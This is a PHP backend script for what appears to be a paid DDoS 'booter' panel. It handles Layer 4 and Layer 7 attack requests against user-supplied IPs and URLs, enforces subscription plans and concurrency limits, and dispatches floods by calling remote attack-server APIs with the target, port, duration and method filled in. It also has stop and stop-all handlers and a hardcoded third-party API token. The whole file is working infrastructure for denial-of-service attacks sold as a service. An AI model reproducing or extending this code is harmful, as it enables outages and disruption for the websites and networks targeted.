<?php
	if (!isset($_SERVER['HTTP_REFERER'])) {
		header('HTTP/1.0 404 Not Found');
		exit();
	}

	require '../../../../backend/configuration/database.php';
	require '../../../../backend/configuration/funcsinit.php';


	if (!$user->UserLoggedIn() || !$user->notBanned($odb)) {
		header('HTTP/1.0 404 Not Found');
		exit();
	}
	if (!($user->activeMembership($odb))) {
		die();
	}

	$type = $_GET['type'];

	if($type == 'l4'){

		$host = $_POST['host'];
		$time = intval($_POST['time']);
		$port = intval($_POST['port']);
		$method = $_POST['method'];
		$concs = intval($_POST['concs']);


		if (!($user->activeMembership($odb))) {
			$errors[] = "Please fill all required fields to create account!";
        	echo json_encode(array('status'=>'error', 'message'=>'You do not have active membership.'));
        	die();

		}

		$SQLMethod = $odb -> prepare("SELECT COUNT(*) FROM `methods` WHERE `apiname` = :method AND `premium` = '1'");
		$SQLMethod -> execute(array(":method" => $method));
		$checkMethod = $SQLMethod ->fetchColumn(0);
		if(!($user->isUserPremium($odb)) && $checkMethod == '1') {
			$errors[] = "You do not have access to this method, please upgrade your plan!";
        	echo json_encode(array('status'=>'error', 'message'=>'You do not have access to this method, please upgrade your plan.'));
        	die();
		}
		
		$MethodDB = $odb -> prepare("SELECT * FROM `methods` WHERE `apiname` = :method");
		$MethodDB -> execute(array(':method' => $method));
		$methodinfo = $MethodDB -> fetch(PDO::FETCH_ASSOC);
		$premiummethod = $methodinfo['premium'];
		$timelimit = $methodinfo['timelimit'];

		$UserInfoDB = $odb -> prepare("SELECT * FROM `users` WHERE `id` = :id");
	    $UserInfoDB -> execute(array(':id' => $_SESSION['id']));
	    $user = $UserInfoDB -> fetch(PDO::FETCH_ASSOC);
	    $planid = $user['plan'];

		$Attacks = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `user` = :user AND `stopped` = 0");
		$Attacks -> execute(array(':user' => $_SESSION['username']));
		$runningattacks = $Attacks -> rowCount();

		$PlanInfo = $odb -> prepare("SELECT * FROM `plans` WHERE `id` = :planid");
		$PlanInfo -> execute(array(':planid' => $planid));

		$plan = $PlanInfo -> fetch(PDO::FETCH_ASSOC);

		$Addons = $odb -> prepare("SELECT `addon_concs`, `addon_time` FROM `users` WHERE `username` = :username");
		$Addons -> execute(array(':username' => $_SESSION['username']));

		$addon = $Addons -> fetch(PDO::FETCH_ASSOC);

		$totalconcs = ($plan['concs'] + $addon['addon_concs']);
		$totalattacktime = ($plan['time'] + $addon['addon_time']);

		if(empty($host) || empty($time) || empty($port) || empty($method) || empty($concs) || $port < 0 || $port > 65500){
			$errors[] = "Please fill all required fields";
        	echo json_encode(array('status'=>'error', 'message'=>'Please fill all required fields.'));
        	die();
		}
		if($time < 30){
			$errors[] = "The minimum value for time is 30 seconds";
        	echo json_encode(array('status'=>'error', 'message'=>'The minimum value for time is 30 seconds.'));
        	die();
		}
		if (!filter_var($host, FILTER_VALIDATE_IP)) {
			$errors[] = "Invalid IP Address format!";
        	echo json_encode(array('status'=>'error', 'message'=>'Invalid IP Address format!'));
        	die();

		}
		if(!(filter_var($time, FILTER_SANITIZE_NUMBER_INT)) || !(filter_var($port, FILTER_SANITIZE_NUMBER_INT))){
			$errors[] = "Invalid port or time value!";
        	echo json_encode(array('status'=>'error', 'message'=>'Invalid port or time value!'));
        	die();
		}
		if(!filter_var($concs, FILTER_SANITIZE_NUMBER_INT)){
			$errors[] = "Invalid concs value!";
        	echo json_encode(array('status'=>'error', 'message'=>'Invalid concs value!'));
        	die();

		}

		if(($runningattacks + $concs) > $plan['concs']){
			$errors[] = "You can’t start as many attacks!";
        	echo json_encode(array('status'=>'error', 'message'=>'You can’t start as many attacks!'));
        	die();
		}

		if($concs > $totalconcs){
			$errors[] = "You reached max number of concurrents";
        	echo json_encode(array('status'=>'error', 'message'=>'You reached max number of your plan concurrents!'));
        	die();
		}

		if($time > $totalattacktime){
			$errors[] = "Maximum time";
        	echo json_encode(array('status'=>'error', 'message'=>'Your maximum boot time is '.$totalattacktime.' seconds!'));
        	die();
		}

		$SQLBlacklist = $odb->prepare("SELECT * FROM `blacklist` WHERE `target` LIKE :target");
		$SQLBlacklist -> execute(array(':target' => "%{$host}%"));
		
		$countBlacklist = $SQLBlacklist -> rowCount();

		if ($countBlacklist > 0) {
			$errors[] = "This target is blacklisted";
        	echo json_encode(array('status'=>'error', 'message'=>'This target is blacklisted!'));
        	die();

		}


		$blacklistcurl = curl_init();
		curl_setopt($blacklistcurl, CURLOPT_URL, 'https://ipinfo.io/'.$host.'?token=d039752cdd62c8');
        curl_setopt($blacklistcurl, CURLOPT_HEADER, 0);
        curl_setopt($blacklistcurl, CURLOPT_NOSIGNAL, 1);
        curl_setopt($blacklistcurl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($blacklistcurl, CURLOPT_RETURNTRANSFER, 2);    
        curl_setopt($blacklistcurl, CURLOPT_TIMEOUT, 3);
        $blacklistresp = curl_exec($blacklistcurl);
        curl_close($blacklistcurl);

        $res = json_decode($blacklistresp, true);

        $asn = $res['org'];

        $SQLBlacklistASN = $odb->prepare("SELECT * FROM `blacklist` WHERE `target` LIKE :target");
		$SQLBlacklistASN -> execute(array(':target' => "%{$asn}%"));

		$countBlacklistASN = $SQLBlacklistASN -> rowCount();

		if ($countBlacklistASN > 0) {
			$errors[] = "This ASN is blacklisted";
        	echo json_encode(array('status'=>'error', 'message'=>'This ASN is blacklisted!'));
        	die();

		}






		
		if($methodinfo['type'] != 'FREEL4' && $user['plan'] == '0'){
			$errors[] = "You do not have access to this method, please upgrade your plan.";
    		echo json_encode(array('status'=>'error', 'message'=>'You do not have access to this method, please purchase plan.'));
    		die();
		}else if($methodinfo['type'] == 'FREEL4' && $user['plan'] != '0'){
			$errors[] = "Only users with Free Plan can use this method!";
    		echo json_encode(array('status'=>'error', 'message'=>'Only users with Free Plan can use this method!'));
    		die();
		}else if($methodinfo['type'] == 'FREEL4' && $user['plan'] == '0' || $methodinfo['type'] != 'FREEL4' && $user['plan'] != '0' ){
			if($timelimit != 0 && $time > $timelimit){
				$errors[] = "Only users with Free Plan can use this method!";
    			echo json_encode(array('status'=>'error', 'message'=>'This method is limited on '.$timelimit.' seconds.'));
    			die();
			}else if($timelimit == 0 || $timelimit != 0 && $time <= $timelimit){
				if(empty($errors)){
					$atck = 0;
						
						$SQLSelectServer = $odb -> prepare("SELECT * FROM `servers` WHERE `id` > 0 AND `status` = 'online' AND `methods` LIKE :method ORDER BY RAND()");
						$SQLSelectServer -> execute(array(':method' => "%{$method}%"));

						while ($server = $SQLSelectServer -> fetch(PDO::FETCH_ASSOC)) {
							if ($atck > 0) {
			                	break;
			            	}
							$name = $server['name'];

							$LogsDB = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `servers` LIKE :name AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
							$LogsDB -> execute(array(':name' => "%{$name}%"));

							$countslots = $LogsDB -> rowCount();

							if ($countslots >= $server['slots']) {
			                	continue;
			            	}else if($concs >= $server['slots']){
			            		continue;
			            	}else if(($countslots+$concs) > $server['slots']){
				            	continue;
				            }
			            	$atck++;

			            	

			            	$FindInApi = array('[host]', '[port]', '[time]', '[method]');
			            	$ApiReplace = array($host, $port, $time, $method);
			            	$API = $server['apiurl'];

			            	$handler[] = $server['name'];

			            	$APIReplaced = str_replace($FindInApi, $ApiReplace, $API);

			            	$handlers = @implode(",", $handler);

			            	

			            	for ($x = 1; $x <= $concs; $x++) {
			            		$datee = date('Y-m-d H:i:s');
			            		$InsertLogs = $odb -> prepare("INSERT INTO `attacklogs`(`id`, `user`, `target`, `port`, `time`, `method`, `concs`, `stopped`, `servers`, `premium`, `apiattack`, `date`, `datetime`) VALUES (NULL, :user, :target, :port, :time, :method, :concs, '0', :handler, :premium, '0', UNIX_TIMESTAMP(NOW()), :datetime)");

								$InsertLogs -> execute(array(':user' => $_SESSION['username'], ':target' => $host, ':port' => $port, ':time' => $time, ':method' => $method, ':concs' => $concs, ':handler' => $handlers, ':premium' => $premiummethod, ':datetime' => $datee));

			            		$ch = curl_init();
			            		curl_setopt($ch, CURLOPT_URL, $APIReplaced);
						        curl_setopt($ch, CURLOPT_HEADER, 0);
						        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
						        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
						        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);    
						        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
						        $result = curl_exec($ch);
						        curl_close($ch);

						        if(!$result){
						        	$errors[] = "There is problem with API, please contact administrator!";
									echo json_encode(array('status'=>'error', 'message'=>'There is problem with API, please contact administrator!'));
									die();
						        }
			            		
							}

						}
						if($atck == 0) {
			        		$errors[] = "No available slots!";
			    			echo json_encode(array('status'=>'error', 'message'=>'No available slots for your attack!'));
			    			die();	
			        	}
						echo json_encode(array('status'=>'success', 'message'=>'Attack successfully sent!'));
						die();
			     
			    }
			}
			
		}

		


	}else if($type == 'l7'){

		$host = $_POST['host'];
		$time = intval($_POST['time']);
		$port = 80;
		$method = $_POST['method'];
		$concs = intval($_POST['concs']);

		$reqmethod = $_POST['reqmethod'];
		$reqs = intval($_POST['reqs']);
		$httpversion = $_POST['httpversion'];
		$referrer = $_POST['referrer'];
		$cookies = $_POST['cookies'];
		$geoloc = $_POST['geoloc'];




		//$csrf = $_POST['csrftoken'];

		if (!($user->activeMembership($odb))) {
			$errors[] = "Please fill all required fields to create account!";
        	echo json_encode(array('status'=>'error', 'message'=>'You do not have active membership.'));
        	die();

		}

		$SQLMethod = $odb -> prepare("SELECT COUNT(*) FROM `methods` WHERE `apiname` = :method AND `premium` = '1'");
		$SQLMethod -> execute(array(":method" => $method));
		$checkMethod = $SQLMethod ->fetchColumn(0);
		if(!($user->isUserPremium($odb)) && $checkMethod == '1') {
			$errors[] = "You do not have access to this method, please upgrade your plan!";
        	echo json_encode(array('status'=>'error', 'message'=>'You do not have access to this method, please upgrade your plan.'));
        	die();
		}
		
		$MethodDB = $odb -> prepare("SELECT * FROM `methods` WHERE `apiname` = :method");
		$MethodDB -> execute(array(':method' => $method));
		$methodinfo = $MethodDB -> fetch(PDO::FETCH_ASSOC);
		$premiummethod = $methodinfo['premium'];
		$timelimit = $methodinfo['timelimit'];

		$UserInfoDB = $odb -> prepare("SELECT * FROM `users` WHERE `id` = :id");
	    $UserInfoDB -> execute(array(':id' => $_SESSION['id']));
	    $user = $UserInfoDB -> fetch(PDO::FETCH_ASSOC);
	    $planid = $user['plan'];

		$Attacks = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `user` = :user AND `stopped` = 0");
		$Attacks -> execute(array(':user' => $_SESSION['username']));
		$runningattacks = $Attacks -> rowCount();

		$PlanInfo = $odb -> prepare("SELECT * FROM `plans` WHERE `id` = :planid");
		$PlanInfo -> execute(array(':planid' => $planid));

		$plan = $PlanInfo -> fetch(PDO::FETCH_ASSOC);

		$Addons = $odb -> prepare("SELECT `addon_concs`, `addon_time` FROM `users` WHERE `username` = :username");
		$Addons -> execute(array(':username' => $_SESSION['username']));

		$addon = $Addons -> fetch(PDO::FETCH_ASSOC);

		$totalconcs = ($plan['concs'] + $addon['addon_concs']);
		$totalattacktime = ($plan['time'] + $addon['addon_time']);

		if(empty($host) || empty($time) || empty($method) || empty($concs) || $port != 80 || empty($reqs)){
			$errors[] = "Please fill all required fields";
        	echo json_encode(array('status'=>'error', 'message'=>'Please fill all required fields.'));
        	die();
		}
		if($reqs > 64){
			$errors[] = "Invalid requets per ip value!";
        	echo json_encode(array('status'=>'error', 'message'=>'Invalid Requests per IP value!'));
        	die();
		}
		if($time < 30){
			$errors[] = "The minimum value for time is 30 seconds";
        	echo json_encode(array('status'=>'error', 'message'=>'The minimum value for time is 30 seconds.'));
        	die();
		}
		if (!filter_var($host, FILTER_VALIDATE_URL)) {
			$errors[] = "Invalid URL format!";
        	echo json_encode(array('status'=>'error', 'message'=>'Invalid URL format!'));
        	die();

		}
		$requestmethods = array('GET', 'POST', 'HEAD');
		if(!in_array($reqmethod, $requestmethods)){
			$errors[] = "Invalid request method value!";
        	echo json_encode(array('status'=>'error', 'message'=>'Invalid request method value!'));
        	die();
		}
		if(!(filter_var($time, FILTER_SANITIZE_NUMBER_INT)) || !(filter_var($concs, FILTER_SANITIZE_NUMBER_INT))){
			$errors[] = "Invalid port or time value!";
        	echo json_encode(array('status'=>'error', 'message'=>'Invalid port or time value!'));
        	die();
		}

		if(($runningattacks + $concs) > $plan['concs']){
			$errors[] = "You can’t start as many attacks!";
        	echo json_encode(array('status'=>'error', 'message'=>'You can’t start as many attacks!'));
        	die();
		}

		if($concs > $totalconcs){
			$errors[] = "You reached max number of concurrents";
        	echo json_encode(array('status'=>'error', 'message'=>'You reached max number of your plan concurrents!'));
        	die();
		}

		if($time > $totalattacktime){
			$errors[] = "Maximum time";
        	echo json_encode(array('status'=>'error', 'message'=>'Your maximum boot time is '.$totalattacktime.' seconds!'));
        	die();
		}

		$SQLBlacklist = $odb->prepare("SELECT * FROM `blacklist` WHERE `target` LIKE :target");
		$SQLBlacklist -> execute(array(':target' => "%{$host}%"));
		
		$countBlacklist = $SQLBlacklist -> rowCount();

		if ($countBlacklist > 0) {
			$errors[] = "This target is blacklisted";
        	echo json_encode(array('status'=>'error', 'message'=>'This target is blacklisted!'));
        	die();

		}


		$BLUrl = $odb -> prepare("SELECT * FROM `blacklist` WHERE `type` = 'URL'");
		$BLUrl -> execute(); 

		$urlarrs = array();
		while($url = $BLUrl -> fetch(PDO::FETCH_ASSOC)){
			$urlarrs[] = $url['target'];
		}

		foreach ($urlarrs as $urlarr) {
			if(strpos($host, $urlarr)) {
				$errors[] = "This website is blacklisted";
				echo json_encode(array('status'=>'error', 'message'=>'This website is blacklisted.'));
				die();
		
			}
		}



		$BLDomain = $odb -> prepare("SELECT * FROM `blacklist` WHERE `type` = 'DOMAIN'");
		$BLDomain -> execute();

		$parameters = array();
		while($domain = $BLDomain -> fetch(PDO::FETCH_ASSOC)){
			$parameters[] = $domain['target'];
		}
			
		foreach ($parameters as $parameter) {
			if(strpos($host, $parameter)) {
				$errors[] = "This domain is blacklisted";
				echo json_encode(array('status'=>'error', 'message'=>'This domain is blacklisted.'));
				die();
		
			}
		}
		

		
		if($methodinfo['type'] != 'FREEL7' && $user['plan'] == '0'){
			$errors[] = "You do not have access to this method, please upgrade your plan.";
    		echo json_encode(array('status'=>'error', 'message'=>'You do not have access to this method, please purchase plan.'));
    		die();
		}else if($methodinfo['type'] == 'FREEL7' && $user['plan'] != '0'){
			$errors[] = "Only users with Free Plan can use this method!";
    		echo json_encode(array('status'=>'error', 'message'=>'Only users with Free Plan can use this method!'));
    		die();
		}else if($methodinfo['type'] == 'FREEL7' && $user['plan'] == '0' || $methodinfo['type'] != 'FREEL7' && $user['plan'] != '0' ){
			if($timelimit != 0 && $time > $timelimit){
				$errors[] = "Only users with Free Plan can use this method!";
    			echo json_encode(array('status'=>'error', 'message'=>'This method is limited on '.$timelimit.' seconds.'));
    			die();
			}else if($timelimit == 0 || $timelimit != 0 && $time <= $timelimit){
				if(empty($errors)){
					$atck = 0;
						
						$SQLSelectServer = $odb -> prepare("SELECT * FROM `servers` WHERE `id` > 0 AND `status` = 'online' AND `methods` LIKE :method ORDER BY RAND()");
						$SQLSelectServer -> execute(array(':method' => "%{$method}%"));

							
							while ($server = $SQLSelectServer -> fetch(PDO::FETCH_ASSOC)) {
								
								if($reqmethod == 'GET' && $method == 'HTTP-ARIA'){
									$methodupdated = 'HTTPGET';
								}else if($reqmethod == 'POST' && $method == 'HTTP-ARIA'){
									$methodupdated = 'HTTPPOST';
								}else if($reqmethod == 'HEAD' && $method == 'HTTP-ARIA'){
									$methodupdated = 'HTTPHEAD';
								}else{
									$methodupdated = $method;
								}

								if ($atck > 0) {
				                	break;
				            	}
								$name = $server['name'];

								$LogsDB = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `servers` LIKE :name AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
								$LogsDB -> execute(array(':name' => "%{$name}%"));

								$countslots = $LogsDB -> rowCount();

								if ($countslots >= $server['slots']) {
				                	continue;
				            	}else if($concs >= $server['slots']){
				            		continue;
				            	}else if(($countslots+$concs) > $server['slots']){
				            		continue;
				            	}
				            	$atck++;

				            	

				            	$FindInApi = array('[host]', '[port]', '[time]', '[method]', '[reqmethod]', '[reqs]', '[version]', '[referrer]', '[cookies]', '[geo]');
				            	$ApiReplace = array($host, $port, $time, $methodupdated, $reqmethod, $reqs, $httpversion, $referrer, $cookies, $geoloc);
				            	$API = $server['apiurl'];

				            	$handler[] = $server['name'];

				            	$APIReplaced = str_replace($FindInApi, $ApiReplace, $API);

				            	$handlers = @implode(",", $handler);

				            	

				            	for ($x = 1; $x <= $concs; $x++) {
									$datee = date('Y-m-d H:i:s');
				            		$InsertLogs = $odb -> prepare("INSERT INTO `attacklogs`(`id`, `user`, `target`, `port`, `time`, `method`, `concs`, `stopped`, `servers`, `premium`, `apiattack`, `date`, `datetime`) VALUES (NULL, :user, :target, :port, :time, :method, :concs, '0', :handler, :premium, '0', UNIX_TIMESTAMP(NOW()), :datetime)");

									$InsertLogs -> execute(array(':user' => $_SESSION['username'], ':target' => $host, ':port' => $port, ':time' => $time, ':method' => $method, ':concs' => $concs, ':handler' => $handlers, ':premium' => $premiummethod, ':datetime' => $datee));
									// echo $methodupdated;
				            		$ch = curl_init();
				            		curl_setopt($ch, CURLOPT_URL, $APIReplaced);
							        curl_setopt($ch, CURLOPT_HEADER, 0);
							        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
							        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
							        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);    
							        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
							        $result = curl_exec($ch);
							        curl_close($ch);

							       	//echo $result;
							       	//echo $APIReplaced;
				            		
				            		if(!$result){
							        	$errors[] = "There is problem with API, please contact administrator!";
										echo json_encode(array('status'=>'error', 'message'=>'There is problem with API, please contact administrator!'));
										die();
							        }
				            		
								}

							}



						if($atck == 0) {
			        		$errors[] = "No available slots for your attack!";
			    			echo json_encode(array('status'=>'error', 'message'=>'No available slots for your attack!'));
			    			die();	
			        	}
						echo json_encode(array('status'=>'success', 'message'=>'Attack successfully sent!'));
						die();
			     
			    }
			}
			
		}



	}else if($type == 'stop'){

		$attackid = intval($_POST['attackid']);
		
		if(!(filter_var($attackid, FILTER_SANITIZE_NUMBER_INT))){
			$errors[] = "There is problem with your request!";
			echo json_encode(array('status'=>'error', 'message'=>'There is problem with your request!'));
			die();		
		}

		$SelectAttack = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `user` = :username AND `id` = :attackid");
    	$SelectAttack -> execute(array('username' => $_SESSION['username'],':attackid' => $attackid));
    	$info = $SelectAttack -> fetch(PDO::FETCH_ASSOC);

    	if($info['user'] != $_SESSION['username']){
    		$errors[] = "This is not your attack!";
			echo json_encode(array('status'=>'error', 'message'=>'This is not your attack!'));
			die();	
    	}

    	

    	if(empty($errors)){
    		$handler = $info['servers'];
    		$handlers = explode(",", $handler);

    		foreach ($handlers as $handler){
		    	$SQLSelectAPI = $odb->prepare("SELECT `apiurl` FROM `servers` WHERE `name` = :handler ORDER BY `id` DESC");
		    	$SQLSelectAPI -> execute(array(':handler' => $handler));
		    	while($api = $SQLSelectAPI -> fetch(PDO::FETCH_ASSOC)){
		    		$stopcommand = "stop";
			    	$FindInApi = array('[host]', '[port]', '[time]', '[method]');
					$ApiReplace = array($info['target'], $info['port'], $info['time'], $stopcommand);
					
			        $APIReplaced = str_replace($FindInApi, $ApiReplace, $api['apiurl']);
			        
			        
			        $stopapi = $APIReplaced;
			        $ch = curl_init();
			        curl_setopt($ch, CURLOPT_URL, $stopapi);
			        curl_setopt($ch, CURLOPT_HEADER, 0);
			        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
			        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);    
			        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
			        $result = curl_exec($ch);
			        curl_close($ch);
			        //echo $result;
		    	}
	    	}	
	        if(!$result){
	        	$errors[] = "There is problem with API, please contact administrator!";
				echo json_encode(array('status'=>'error', 'message'=>'There is problem with API, please contact administrator!'));
				die();
	        }

			$UpdateAttack = $odb -> prepare("UPDATE `attacklogs` SET `stopped` = 1 WHERE `id` = :attackid");
			$UpdateAttack -> execute(array(':attackid' => $attackid));

    		echo json_encode(array('status'=>'success', 'message'=>'Attack '.$attackid.' successfully stopped!'));

    	}
		


	}else if($type == 'stopall'){
		
		$SelectAttack = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0 AND `user` = :username");
    	$SelectAttack -> execute(array('username' => $_SESSION['username']));
    	$info = $SelectAttack -> fetch(PDO::FETCH_ASSOC);
    	$countattacks = $SelectAttack -> rowCount();

   //  	if($info['user'] != $_SESSION['username']){
   //  		$errors[] = "This is not your attack!";
			// echo json_encode(array('status'=>'error', 'message'=>'This is not your attack!'));
			// die();	
   //  	}

    	if($countattacks == 0){
    		$errors[] = "There is no running attacks.";
			echo json_encode(array('status'=>'error', 'message'=>'There is no running attacks.'));
			die();
    	}
    	

    	if(empty($errors)){
    		$handler = $info['servers'];
    		$handlers = explode(",", $handler);

    		foreach ($handlers as $handler){
		    	$SQLSelectAPI = $odb->prepare("SELECT `apiurl` FROM `servers` WHERE `name` = :handler ORDER BY `id` DESC");
		    	$SQLSelectAPI -> execute(array(':handler' => $handler));
		    	$api = $SQLSelectAPI -> fetch(PDO::FETCH_ASSOC);
		    	$SelectAttackk = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0 AND `user` = :username");
    			$SelectAttackk -> execute(array('username' => $_SESSION['username']));
		    	while($infoo = $SelectAttackk -> fetch(PDO::FETCH_ASSOC)) {
		    		$target = $infoo['target'];
		    		$port = $infoo['port'];
		    		$time = $infoo['time'];
		    		
		    		$stopcommand = "stop";
			    	$FindInApi = array('[host]', '[port]', '[time]', '[method]');
					$ApiReplace = array($info['target'], $info['port'], $info['time'], $stopcommand);
					
			        $APIReplaced = str_replace($FindInApi, $ApiReplace, $api['apiurl']);
			        
			        
			        $stopapi = $APIReplaced;
			        $ch = curl_init();
			        curl_setopt($ch, CURLOPT_URL, $stopapi);
			        curl_setopt($ch, CURLOPT_HEADER, 0);
			        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
			        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);    
			        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
			        $result = curl_exec($ch);
			        curl_close($ch);
		    	}
	    	}	
	        if(!$result){
	        	$errors[] = "There is problem with API, please contact administrator!";
				echo json_encode(array('status'=>'error', 'message'=>'There is problem with API, please contact administrator!'));
				die();
	        }

			$UpdateAttack = $odb -> prepare("UPDATE `attacklogs` SET `stopped` = 1 WHERE `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0 AND `user` = :user");
			$UpdateAttack -> execute(array(':user' => $_SESSION['username']));

    		echo json_encode(array('status'=>'success', 'message'=>'All running attacks successfully stopped!'));

    	}
		


	}
	











?>